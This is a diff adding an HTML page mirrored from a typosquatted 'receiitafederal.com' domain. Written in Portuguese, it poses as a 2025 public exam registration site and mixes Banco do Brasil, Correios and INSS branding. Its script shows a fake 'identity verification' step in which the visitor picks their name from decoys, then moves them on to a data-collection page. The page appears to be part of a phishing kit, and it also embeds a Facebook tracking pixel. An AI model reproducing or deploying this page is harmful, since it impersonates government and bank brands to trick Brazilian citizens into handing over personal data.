@@ -1,0 +1,179 @@
+<!DOCTYPE html><html><!-- Mirrored from receiitafederal.com/bb/consulta.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2025 01:41:27 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Correios - Inscrição Concurso 2025</title>
+
+  <!-- Preload fonts -->
+  <link rel="preload" href="https://receiitafederal.com/static/fonts/YAltSUSktqZa.woff2" as="font" type="font/woff2" crossorigin="">
+  <link rel="preload" href="https://receiitafederal.com/static/fonts/wbAxz3JwU90P.woff2" as="font" type="font/woff2" crossorigin="">
+
+  <!-- Styles -->
+  <link href="css/ywpjWIOBTTwg.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <link href="css/wrmabR523rfZ.css" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'rawline', sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .animate-spin { animation: spin 1s linear infinite; }
+  </style>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: { 'bb-yellow': '#FEEF37', 'bb-blue': '#003DA5' }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col">
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1162112411969539&ev=PageView&noscript=1" />
+  </noscript>
+
+  <!-- Cabeçalho -->
+  <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="container mx-auto px-4">
+      <div class="flex flex-col items-center text-center">
+        <img src="images/uDnvve3cM2Rm.png" alt="Logo do Banco do Brasil" class="h-12 mb-2">
+        <div>
+          <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+            CONCURSO PÚBLICO 2025
+          </p>
+          <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
+            SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Barra de navegação -->
+  <div class="bg-bb-blue py-3 shadow-md">
+    <div class="container mx-auto px-4 flex items-center">
+      <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+        <div class="w-2 h-2 bg-white"></div>
+        <div class="w-2 h-2 bg-white"></div>
+        <div class="w-2 h-2 bg-white"></div>
+        <div class="w-2 h-2 bg-white"></div>
+      </div>
+      <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">
+        Sistema de Inscrição
+      </span>
+    </div>
+  </div>
+
+  <!-- Conteúdo Principal -->
+  <div class="container mx-auto px-4 py-6 flex-grow">
+    <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
+      <!-- Título e Instruções -->
+      <h2 class="text-2xl font-bold text-bb-blue mb-2 text-center">VERIFICAÇÃO DE IDENTIDADE</h2>
+      <p class="text-lg text-gray-700 mb-4 text-center">Verificação de Segurança - Etapa 1 de 2</p>
+      <p class="text-sm text-gray-700 mb-6 text-center">Para sua segurança, selecione seu nome completo correto:</p>
+
+      <!-- Formulário para verificação -->
+      <form id="verificacaoForm">
+        <div id="nomeOptions" class="space-y-4">
+          <!-- As opções serão inseridas aqui via JavaScript -->
+        </div>
+
+        <button type="submit" id="confirmarBtn" class="mt-6 bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 
+                 rounded-md w-full flex items-center justify-center space-x-2 
+                 shadow-md hover:shadow-lg transition duration-200">
+          <span>Confirmar Nome</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Rodapé -->
+  <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
+    <p class="text-sm font-medium">© 2025 INSS S.A. Todos os direitos reservados.</p>
+    <p class="text-sm mt-1">Central de Atendimento INSS - 0800 729 0722</p>
+  </div>
+
+  <script>
+    // Recupera o nome verdadeiro armazenado no localStorage
+    const nomeCandidato = localStorage.getItem('nomeCandidato');
+    if (!nomeCandidato) {
+      alert('Erro: Nome do candidato não encontrado.');
+      window.location.href = 'index.html';
+    }
+
+    // Array de nomes possíveis para alternativas erradas
+    const nomesPossiveis = [
+      "PAULO RIBEIRO MARTINS",
+      "ANA PAULA COSTA",
+      "MARIA SILVA",
+      "JOÃO DOS SANTOS",
+      "FERNANDA LIMA"
+    ];
+
+    // Filtra as alternativas erradas (excluindo o nome correto)
+    const nomesErrados = nomesPossiveis.filter(
+      nome => nome.trim().toUpperCase() !== nomeCandidato.trim().toUpperCase()
+    );
+
+    // Função para selecionar aleatoriamente "quantidade" itens do array
+    function selecionarAleatoriamente(arr, quantidade) {
+      return arr.sort(() => Math.random() - 0.5).slice(0, quantidade);
+    }
+
+    // Seleciona 2 nomes errados aleatórios
+    const alternativasErradas = selecionarAleatoriamente(nomesErrados, 2);
+
+    // Cria um array com as três opções (incluindo o nome correto) e embaralha
+    const opcoes = [
+      ...alternativasErradas.map(nome => ({ nome, correta: false })),
+      { nome: nomeCandidato, correta: true }
+    ].sort(() => Math.random() - 0.5);
+
+    // Insere as opções no HTML
+    const nomeOptionsContainer = document.getElementById('nomeOptions');
+    nomeOptionsContainer.innerHTML = opcoes
+      .map((opcao, index) => `
+        <div class="flex items-center">
+          <input 
+            id="nome${index}" 
+            name="nome" 
+            type="radio" 
+            value="${opcao.nome}" 
+            class="h-4 w-4 text-bb-blue focus:ring-bb-blue border-gray-300"
+          >
+          <label for="nome${index}" class="ml-3 block text-sm font-medium text-gray-700">
+            ${opcao.nome}
+          </label>
+        </div>
+      `)
+      .join('');
+
+    // Lidando com a submissão do formulário de verificação de identidade
+    document.getElementById('verificacaoForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      // Verifica qual radio foi selecionado
+      const selecionado = document.querySelector('input[name="nome"]:checked');
+      if (!selecionado) {
+        alert('Por favor, selecione um dos nomes antes de confirmar.');
+        return;
+      }
+
+      // Compara se a opção selecionada é o nome correto
+      if (selecionado.value.trim().toUpperCase() === nomeCandidato.trim().toUpperCase()) {
+        // Redireciona para a próxima etapa se o nome estiver correto
+        window.location.href = 'data.html';
+      } else {
+        alert('O nome selecionado não confere com nossos registros. Tente novamente.');
+      }
+    });
+  </script>
+
+
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508546'},{'dcenter':'p3'},{'cp_id':'10284161'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script>
+</body><!-- Mirrored from receiitafederal.com/bb/consulta.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2025 01:41:30 GMT --></html>
